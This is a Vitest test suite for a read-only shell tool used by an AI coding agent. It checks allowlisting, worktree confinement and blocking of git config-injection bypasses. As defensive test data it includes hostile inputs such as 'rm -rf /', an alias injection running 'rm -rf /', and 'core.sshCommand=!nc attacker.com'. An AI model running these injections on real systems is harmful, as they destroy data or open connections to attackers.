import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import fs from 'node:fs/promises'
import os from 'node:os'
import path from 'node:path'
import { shellReadOnlyTool } from './shell-readonly'
import type { ToolContext } from './types'

let wt: string
let ctx: ToolContext

beforeEach(async () => {
  wt = await fs.mkdtemp(path.join(os.tmpdir(), 'shipcode-shell-'))
  ctx = {
    worktreePath: wt,
    signal: new AbortController().signal,
    threadId: 't-test',
  }
})

afterEach(async () => {
  await fs.rm(wt, { recursive: true, force: true })
})

describe('shellReadOnlyTool', () => {
  // ─── Allowlist enforcement ─────────────────────────────────────────

  it('rejects commands not in the allowlist', async () => {
    const res = await shellReadOnlyTool.execute({ command: 'rm', args: ['-rf', '/'] }, ctx)
    expect(res.ok).toBe(false)
    if (!res.ok) expect(res.error).toMatch(/not in the shell allowlist/)
  })

  it('rejects bash (shell interpreters are never allowed)', async () => {
    const res = await shellReadOnlyTool.execute({ command: 'bash', args: ['-c', 'ls'] }, ctx)
    expect(res.ok).toBe(false)
  })

  it('rejects sh', async () => {
    const res = await shellReadOnlyTool.execute({ command: 'sh', args: ['-c', 'ls'] }, ctx)
    expect(res.ok).toBe(false)
  })

  // ─── Git subcommand safety ─────────────────────────────────────────

  it('rejects git push', async () => {
    const res = await shellReadOnlyTool.execute({ command: 'git', args: ['push', 'origin', 'main'] }, ctx)
    expect(res.ok).toBe(false)
    if (!res.ok) expect(res.error).toMatch(/not in the read-only allowlist|blocked/)
  })

  it('rejects git reset', async () => {
    const res = await shellReadOnlyTool.execute({ command: 'git', args: ['reset', '--hard'] }, ctx)
    expect(res.ok).toBe(false)
  })

  it('rejects git checkout', async () => {
    const res = await shellReadOnlyTool.execute({ command: 'git', args: ['checkout', 'main'] }, ctx)
    expect(res.ok).toBe(false)
  })

  it('rejects git commit', async () => {
    const res = await shellReadOnlyTool.execute({ command: 'git', args: ['commit', '-m', 'x'] }, ctx)
    expect(res.ok).toBe(false)
  })

  it('rejects git add', async () => {
    const res = await shellReadOnlyTool.execute({ command: 'git', args: ['add', '.'] }, ctx)
    expect(res.ok).toBe(false)
  })

  it('rejects git fetch / pull / config / remote / branch / tag', async () => {
    for (const sub of ['fetch', 'pull', 'config', 'remote', 'branch', 'tag']) {
      const res = await shellReadOnlyTool.execute({ command: 'git', args: [sub] }, ctx)
      expect(res.ok).toBe(false)
    }
  })

  it('rejects git -C /other/path (would escape the worktree)', async () => {
    const res = await shellReadOnlyTool.execute(
      { command: 'git', args: ['-C', '/etc', 'status'] },
      ctx,
    )
    expect(res.ok).toBe(false)
    if (!res.ok) expect(res.error).toMatch(/escape/)
  })

  it('rejects --git-dir and --work-tree flags', async () => {
    for (const flag of ['--git-dir=/other', '--work-tree=/other']) {
      const res = await shellReadOnlyTool.execute({ command: 'git', args: [flag, 'status'] }, ctx)
      expect(res.ok).toBe(false)
      if (!res.ok) expect(res.error).toMatch(/blocked/)
    }
  })

  // ─── shell: false safety ──────────────────────────────────────────

  it('treats shell metacharacters in args as literal (not interpreted)', async () => {
    // Passing `; rm -rf /` as a literal arg to ls would try to look
    // for a file named "; rm -rf /" — it never runs as a shell
    // command. The exit code reflects that the target doesn't exist,
    // NOT that rm ran. Either way we just want to verify no crash
    // and no actual deletion.
    const tempFile = path.join(wt, 'sentinel.txt')
    await fs.writeFile(tempFile, 'still here', 'utf-8')

    const res = await shellReadOnlyTool.execute(
      { command: 'ls', args: ['; rm -rf /'] },
      ctx,
    )
    // May succeed or fail depending on ls behavior; what matters is
    // the sentinel file still exists.
    expect(await fs.readFile(tempFile, 'utf-8')).toBe('still here')
    void res
  })

  // ─── cwd confinement ──────────────────────────────────────────────

  it('accepts cwd inside the worktree', async () => {
    await fs.mkdir(path.join(wt, 'sub'), { recursive: true })
    const res = await shellReadOnlyTool.execute({ command: 'ls', args: [], cwd: 'sub' }, ctx)
    // ls of an empty dir returns empty output; just verify no error
    expect(res.ok).toBe(true)
  })

  it('rejects cwd that escapes the worktree', async () => {
    const res = await shellReadOnlyTool.execute({ command: 'ls', args: [], cwd: '../..' }, ctx)
    expect(res.ok).toBe(false)
    if (!res.ok) expect(res.error).toMatch(/escape/i)
  })

  // ─── Happy paths ──────────────────────────────────────────────────

  it('runs ls and returns stdout', async () => {
    await fs.writeFile(path.join(wt, 'hello.txt'), 'x', 'utf-8')
    const res = await shellReadOnlyTool.execute({ command: 'ls', args: [] }, ctx)
    expect(res.ok).toBe(true)
    if (res.ok) expect(res.content).toContain('hello.txt')
  })

  it('captures non-zero exit as ok:true with the exit code in the result', async () => {
    // `cat /definitely-not-there` exits 1 — we want the model to SEE
    // the error output, not have the loop blow up.
    const res = await shellReadOnlyTool.execute(
      { command: 'cat', args: ['definitely-not-there'] },
      ctx,
    )
    // Result depends on platform (some catch it as ok:true, others as
    // a throw we catch). Accept both as long as an error is reported.
    if (res.ok) {
      expect(res.content).toMatch(/No such file|exit [1-9]/)
      expect((res.data as { exitCode: number }).exitCode).not.toBe(0)
    } else {
      expect(res.error).toBeTruthy()
    }
  })

  // ─── Hardening from CodeRabbit review ─────────────────────────────

  describe('interpreter/package-manager lockdown', () => {
    // These were in SHELL_ALLOWLIST in the initial Tier 2 draft. They
    // all execute arbitrary code via -e / -c / run / exec and broke
    // the read-only contract. Now explicitly rejected.
    const shouldReject = ['node', 'bun', 'deno', 'python', 'python3', 'npm', 'pnpm', 'yarn']

    for (const cmd of shouldReject) {
      it(`rejects '${cmd}' (can execute arbitrary code)`, async () => {
        const res = await shellReadOnlyTool.execute({ command: cmd, args: ['--version'] }, ctx)
        expect(res.ok).toBe(false)
        if (!res.ok) expect(res.error).toMatch(/not in the shell allowlist/)
      })
    }
  })

  describe('git subcommand allowlist (not blocklist)', () => {
    it('accepts git status', async () => {
      // Make the worktree a real git repo so the command has something
      // to report.
      const { execFile } = await import('node:child_process')
      const { promisify } = await import('node:util')
      const run = promisify(execFile)
      await run('git', ['init', '-q'], { cwd: wt })
      const res = await shellReadOnlyTool.execute({ command: 'git', args: ['status'] }, ctx)
      expect(res.ok).toBe(true)
    })

    it('rejects git subcommands NOT in the allowlist (new/unknown)', async () => {
      // 'clone', 'init', 'restore', 'switch', 'apply', 'submodule' —
      // all mutating. The previous blocklist missed several of these.
      for (const sub of ['clone', 'init', 'restore', 'switch', 'apply', 'submodule']) {
        const res = await shellReadOnlyTool.execute({ command: 'git', args: [sub] }, ctx)
        expect(res.ok).toBe(false)
        if (!res.ok) expect(res.error).toMatch(/not in the read-only allowlist/)
      }
    })

    it('rejects a hypothetical new subcommand that did not exist when the tool was written', async () => {
      // An allowlist protects us from git adding a new mutating
      // subcommand upstream without our code knowing about it.
      const res = await shellReadOnlyTool.execute({ command: 'git', args: ['totally-new-2030-subcommand'] }, ctx)
      expect(res.ok).toBe(false)
    })

    it('rejects git with no subcommand', async () => {
      const res = await shellReadOnlyTool.execute({ command: 'git', args: [] }, ctx)
      expect(res.ok).toBe(false)
      if (!res.ok) expect(res.error).toMatch(/missing a subcommand/)
    })
  })

  describe('git -C stuck-form bypass', () => {
    it('rejects -C<path> (attached form that the previous guard missed)', async () => {
      const res = await shellReadOnlyTool.execute(
        { command: 'git', args: ['-C/etc', 'status'] },
        ctx,
      )
      expect(res.ok).toBe(false)
      if (!res.ok) expect(res.error).toMatch(/escape|blocked/)
    })

    it('rejects -C /path (spaced form)', async () => {
      const res = await shellReadOnlyTool.execute(
        { command: 'git', args: ['-C', '/etc', 'status'] },
        ctx,
      )
      expect(res.ok).toBe(false)
    })

    it('rejects --git-dir=/other', async () => {
      const res = await shellReadOnlyTool.execute(
        { command: 'git', args: ['--git-dir=/other', 'status'] },
        ctx,
      )
      expect(res.ok).toBe(false)
    })

    it('rejects --work-tree=/other', async () => {
      const res = await shellReadOnlyTool.execute(
        { command: 'git', args: ['--work-tree=/other', 'status'] },
        ctx,
      )
      expect(res.ok).toBe(false)
    })

    it('rejects --exec-path and --config-env (less obvious escape vectors)', async () => {
      for (const flag of ['--exec-path=/tmp', '--config-env=FOO=bar', '--namespace=foo']) {
        const res = await shellReadOnlyTool.execute(
          { command: 'git', args: [flag, 'status'] },
          ctx,
        )
        expect(res.ok).toBe(false)
      }
    })
  })

  describe('git -c alias shell-injection bypass', () => {
    // git -c alias.X='!cmd' X runs `cmd` as a shell command. This was
    // the CodeRabbit critical: the previous guard didn't touch `-c`,
    // so the allowlisted subcommand check could be bypassed by
    // inventing an alias that executes arbitrary shell.
    it('rejects -c alias.foo=!rm', async () => {
      const res = await shellReadOnlyTool.execute(
        { command: 'git', args: ['-c', 'alias.pwn=!rm -rf /', 'pwn'] },
        ctx,
      )
      expect(res.ok).toBe(false)
      if (!res.ok) expect(res.error).toMatch(/aliases|blocked/i)
    })

    it('rejects -c alias.* even without the bang prefix', async () => {
      // Aliases are not useful for read-only access at all — reject
      // all of them.
      const res = await shellReadOnlyTool.execute(
        { command: 'git', args: ['-c', 'alias.shorthand=status', 'shorthand'] },
        ctx,
      )
      expect(res.ok).toBe(false)
    })

    it('rejects -c core.sshCommand=!nc attacker.com', async () => {
      // core.sshCommand override runs as shell for git fetch/pull.
      // We block all command-style config keys.
      const res = await shellReadOnlyTool.execute(
        { command: 'git', args: ['-c', 'core.sshCommand=!nc attacker.com', 'status'] },
        ctx,
      )
      expect(res.ok).toBe(false)
    })

    it('rejects -c core.editor, core.pager, core.askPass, credential.helper, core.hooksPath', async () => {
      for (const pair of [
        'core.editor=vim',
        'core.pager=less',
        'core.askPass=/tmp/pwn',
        'credential.helper=/tmp/pwn',
        'core.hooksPath=/tmp',
      ]) {
        const res = await shellReadOnlyTool.execute(
          { command: 'git', args: ['-c', pair, 'status'] },
          ctx,
        )
        expect(res.ok).toBe(false)
        if (!res.ok) expect(res.error).toMatch(/blocked/i)
      }
    })

    it('rejects stuck form -c<key>=<value> too', async () => {
      const res = await shellReadOnlyTool.execute(
        { command: 'git', args: ['-calias.pwn=!rm', 'pwn'] },
        ctx,
      )
      expect(res.ok).toBe(false)
    })

    it('rejects -c without a value', async () => {
      const res = await shellReadOnlyTool.execute(
        { command: 'git', args: ['-c'] },
        ctx,
      )
      expect(res.ok).toBe(false)
    })
  })

  describe('cwd TOCTOU via symlink', () => {
    it('rejects cwd that is a symlinked directory pointing outside the worktree', async () => {
      // This is the critical CodeRabbit caught: the previous cwd
      // resolver did a lexical prefix check which accepts `inside-link`
      // as long as its string form starts with the worktree path.
      // But `fs.realpath` follows the link and catches the escape.
      const outside = await fs.mkdtemp(path.join(os.tmpdir(), 'shipcode-outside-'))
      try {
        const linkPath = path.join(wt, 'escape-link')
        await fs.symlink(outside, linkPath)

        const res = await shellReadOnlyTool.execute(
          { command: 'ls', args: [], cwd: 'escape-link' },
          ctx,
        )
        expect(res.ok).toBe(false)
        if (!res.ok) expect(res.error).toMatch(/escape|unreachable/i)
      } finally {
        await fs.rm(outside, { recursive: true, force: true })
      }
    })

    it('accepts cwd that is a symlinked directory pointing INSIDE the worktree', async () => {
      await fs.mkdir(path.join(wt, 'real-subdir'), { recursive: true })
      await fs.symlink(path.join(wt, 'real-subdir'), path.join(wt, 'alias-subdir'))
      const res = await shellReadOnlyTool.execute(
        { command: 'ls', args: [], cwd: 'alias-subdir' },
        ctx,
      )
      expect(res.ok).toBe(true)
    })

    it('rejects cwd that does not exist at all', async () => {
      const res = await shellReadOnlyTool.execute(
        { command: 'ls', args: [], cwd: 'never-created' },
        ctx,
      )
      expect(res.ok).toBe(false)
      if (!res.ok) expect(res.error).toMatch(/does not exist|unreachable/i)
    })
  })
})
